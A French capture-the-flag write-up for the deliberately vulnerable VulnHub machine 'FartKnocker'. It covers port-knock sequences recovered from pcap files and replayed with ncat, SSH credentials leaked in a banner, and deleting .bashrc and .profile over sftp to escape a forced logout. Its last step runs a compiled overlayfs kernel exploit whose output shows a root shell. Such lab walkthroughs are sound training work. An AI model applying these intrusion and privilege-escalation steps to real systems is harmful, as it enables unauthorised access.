# Solution du CTF FartKnocker de VulnHub

[TopHatSec: FartKnocker](https://vulnhub.com/entry/tophatsec-fartknocker,115/) est le dernier d'une série de 3 CTFs. Le titre du CTF laisse entendre qu'il y aura du port-knocking (tenter de se connecter à une suite de ports dans un ordre précis en ouvre un autre).

Pou commencer on dispose juste du port 80 :

```
Nmap scan report for 192.168.56.101
Host is up (0.00018s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
```

Sur la page du site on trouve une capture réseau au format pcap. On l'ouvre avec `Wireshark` et on trouve quelques tentatives (flag `SYN` mais réponse `RST`) pour accèder à des ports TCP.

D'abord une série sur les ports 7000, 8000 puis 9000 et ensuite une autre série avec les même ports et une tentative final sur le port 8888.

Je reproduis la séquence avec `ncat` :

```bash
ncat -z 192.168.56.101 7000; ncat -z 192.168.56.101 8000; ncat -z 192.168.56.101 9000; ncat -z 192.168.56.101 8888
```

et lors d'un nouveau scan de ports, on a un nouveau service :

```
8888/tcp open  sun-answerbook?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, LSCP, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    /burgerworld/
```

Le port ne retourne que le message `/burgerworld/`. On se rend donc sur ce path sur le port 80 et on a un nouveau fichier pcap...

Sur celui-ci on a des données transmises lors de la connecion au port 8080 :

```

                      MMMMMMM           MMMMMMH 
                HMMMMM:::::::.MMMMMMMMMM:::::.TMM
              MMMI:::::::::::::::::::MMH::::::::TM
            MMIi::::::::::::.:::::::::::::::::::::MMMM
           MT::::.::::::::::::::::::::::::::::::.::=T.IMMM
         MMMi:::::::::::::::::::::::::::::::::::::::::::MT)MM
     MMMI.:::::::::::::::::::::::::::::::::::::::::::.:::M= MM
   XMXi::::::::::::::::::::::.:::::::::::::::::::::::::::::::=MM
   MMi::::::::::::::::::::::::::::::::::::::::::::::::::.::..:=MMM
  MM:MMT:::::::::.:::::::::::::::::.:::::::::::::::::::::::::::MiMM
   MMM::::::::::::::::::.::::::::::::::::::::::::::.::::::::::.TM.MM
   MMi::::::::::::::.::::::::::::::::::::::::::::::::::::::.:::.:: M
   MM:::.::::::::::::::::::::::::::::::::.:.:::::::::::::::::::::: XM
 MM:MT::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::XM
IMM:::.::::::::::::::::::::::::::::::::::: :::::::::::::::::::::::.=M
 MM::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: :::M
 XMT:::::::::::::::::::::: ::::::::::::::::: : ::::::::::::::::::: iM
   MiMi:::::::::: :::::::::::::::::::::::::::::::: ::::::::::::::.:IM
     M::::::HH::::::::::::::::::::::::::::::::::::::::::::::::::::: M
     MT:::::iM::::::::Hi:iXH:::ii::XH:::::::::::::.::::::::::::::.:.M
      MX:::::iMX:i::::iMi:iMH::XH::Mi:::::::::::::::::::::::::::::: M
        Mii::::HMH:::::iMH::MH=:MM=TMi::::::::::::::::::::::::::::::MM
          MMMMMMMMMMMXTi:MMHi:HMMIMMMMii::::::::::::::::::::::::::::XM
           XXOXMMT:. ::T= :IMMMMMMM=iXMii:::::::::::::::::::::::::: MM
            MMMH:::.:::::::.::::.::::.:XMi::::::::::::::::::::::::::MM
           XMM::.:.:..::..:.:.::.:.::: ::XMi::::::::::::::::::::::::MX
          XMMT::::.:.::.::::.::.::::::::.::XH:::::::::::::::::::::: M
          HMX::...:..::..:.:.::::::..... :::XX::::::::::::::.:::::. M
          MM:::....:::::.::::::..:::::.:..:::HX::::::::::::::::::::=M
          MX::::::::::::::::::::::..::::.:..::X::::::::::::::::::::IM
         XMI..  .:.::....:..::::.:: ::...::.:.MH:::::::::::::::::.: M
         MM:. ::..::....::.::::::....:.:...:..MT::.   ::::::::: :..IM
         MM=:::::.::.:::::..::::.: .::..::..::Mi:::::::::::::::::: MM
         MMI:::...:  .::..::::::.:::::::.::::TM:::::::::::::::::::=MO
          MH.: .::::.::.. .:::::iLMXX=::::.:.Mi::::::: ::::::::::.MM
          MX:.:..:: .:.:.:.: :MMM:::..:::::.HM:::: :::::::::::::.MM
          MM:::...::....: ::IMT:::.:...:.::.MT::::::: ::::::::: MM
           M=::..::::..:::MM:i:..::.:...: ::M:::: ::: ::::::::::MI
           MH::: :.:.: MMMM=:::.:.:...:....iM::: ::::::  ::::::LM
          MMMMT.::. ::TM:::::..::::::::.::.IM::::HH:::::::::::.MO
           MM:LM::T:MT.:: .......:....:.:: TMMiXMT.MH:::.::::.:M=
            M:. :::MMi:::MMMM=::::::.::..::=MMMMMMXMH:::.:::::MM
           XMI: :..::=MX  :M::.......:...:::.MXTHM MH:::.: :.XM
           MM XMMI IM    M   ................:: :MIIM:::::::MMO
            MMXXMILM  .ML.= :.:::....:.:..::.:..:::MMT:::::TMM
              MXMLMMMT::.:...:........ ....::.:.=.MMMM:::::MM
              MHM=:: :.:::...::::.:...:.....:: =MMM==Mi::::M
              MM=:::.......:.:.::.:.::...:.: ::  . ::=M:: MM
             MMi:=XMMMi::::...:::::.::.:::::::::..: ::Mi:=MT
            MM=:I::  :iMH==:::::.::.:::::::::::::::.::MT:XMT
           MT=:=MMMMMMM=HM::::.::::::MMT=Mi::::::..:::MI=MM
          M ::::::.=I= .MX:..: ::::.::MX::::.:::.:.  .XMMM
         M:MMMMMMM=.::::  ::.::...:.MMIM::.:::.::..::::M
                 M=:: : ::::.==XMMM:XMMM=:::.::.:.::::.M
                 M=.IMMM )X   M  MMMMMM=:::..::..:::.::M
                 MM  X  MMM:MMMMMMMMM=:::.:.:.. .:.::::M
                  MIMMMMMMMMMMMMMMI::::::::.:::.:...:.:M
                MMMMMMMMMMMMMX:.   .:..::....:...:::.:iM
               MMMMMMMMMMI::::::.:.::...:....:.....:.:=M
           MMMMMMMMMI:::::.:.. :.::.::..........:..:..:M
            M=:  :..::..::.........::.......::.:.....: M
             MMMi::::::.:.:==MMMMMMMMMT:.:.:::..:::..: OM
               MM=::..: OMMMM         MMMT:::....:.::: :M
                M=::::MM                MMI:::........:OM
                 MMMMM                   MMH:::..::MMMMMM
                                          MMMMMMMMMMMMMMM


                     CAN YOU UNDERSTAND MY MESSAGE?!



			  eins drei drei sieben
```

Soit 1 3 3 7 en allemand. On se connecte au port 1337 et on obtient le lien `/iamcornholio/` qui délivre le message `T3BlbiB1cCBTU0g6IDg4ODggOTk5OSA3Nzc3IDY2NjYK` soit, décodé en base64 :

> Open up SSH: 8888 9999 7777 6666

De la même façon je suis la séquence de ports avec ncat et je peux désormais accèder au port 22. N'ayant pas d'identifiants particuliers à saisir j'utilise `Beavis` mais le service donne suffisamment d'informations :

```shellsession
$ ssh Beavis@192.168.56.101
The authenticity of host '192.168.56.101 (192.168.56.101)' can't be established.
ED25519 key fingerprint is SHA256:Uezp17zkhiRikxBiu5NIZtI0d6nSfyNmetGpcB8AjOA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.101' (ED25519) to the list of known hosts.
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
Beavis@192.168.56.101's password:
```

On utilise ces identifiants pour nous connecter mais on est aussitôt déconnectés :

```shellsession
$ ssh butthead@192.168.56.101
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
butthead@192.168.56.101's password: 
Welcome to Ubuntu 14.04.2 LTS (GNU/Linux 3.13.0-46-generic i686)

 * Documentation:  https://help.ubuntu.com/
Last login: Tue Mar  3 01:02:49 2015 from 192.168.56.102
You are only logging in for a split second! What do you do!
```

On peut passer à SSH la commande à exécuter, ici bash :

```shellsession
$ ssh butthead@192.168.56.101 bash
############################################
# CONGRATS! YOU HAVE OPENED THE SSH SERVER #
# USERNAME: butthead                       #
# PASSWORD: nachosrule                     #
############################################
butthead@192.168.56.101's password: 
ls -al
total 28
drwxr-xr-x 3 butthead butthead 4096 Mar  3  2015 .
drwxr-xr-x 4 root     root     4096 Mar  3  2015 ..
-rw-r--r-- 1 butthead butthead  220 Apr  8  2014 .bash_logout
-rw-r--r-- 1 butthead butthead 3685 Mar  3  2015 .bashrc
drwx------ 2 butthead butthead 4096 Mar  3  2015 .cache
-rw-rw-r-- 1 butthead butthead   67 Mar  3  2015 nachos
-rw-r--r-- 1 butthead butthead  747 Mar  3  2015 .profile
tail .bashrc
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi

logout
pkill -Kill -u butthead
TMOUT=1
```

Les fichiers `.bashrc ` et `.profile` ont des commandes qui terminent notre connexion. On peut utiliser `sftp` pour les supprimer :

```shellsession
sftp> rm .bashrc 
Removing /home/butthead/.bashrc
sftp> rm .profile
Removing /home/butthead/.profile
```

Une fois connecté on ne voit rien de particulier pour passer root. Le système semble toutefois vulnérable à `DirtyCOW` et `overlayfs`.

L'exploit pour `DirtyCOW` semble rendre le système instable et je suis obligé de le redémarrer.

L'exploit pour `overlayfs` marche bien en revanche :

```shellsession
$ gcc -o ofs ofs.c
$ ./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
uid=0(root) gid=0(root) groups=0(root),1001(butthead)
# cd /root
# ls
SECRETZ
# cat SECRETZ
You have done a great job, if you can see this, please shoot me an email
and let me know that you have beat this box!

SECRET = "LIVE LONG AND PROSPER, REST IN PEACE MR. SPOCK"

admin@top-hat-sec.com
```

Autre solution possible : l'utilisateur local `beavis` avait un mot de passe relatif au dessin animé (voir [ContactL3ft's Randomness: TopHatSec - Fartknocker VM](https://c0ntactl3ft.blogspot.com/2015/04/tophatsec-fartknocker-vm-hosted-on.html)).

Le mot de passe n'étant pas dans la wordlist rockyou, une attaque bruteforce n'aurait pas aboutit.

*Publié le 2 janvier 2023*
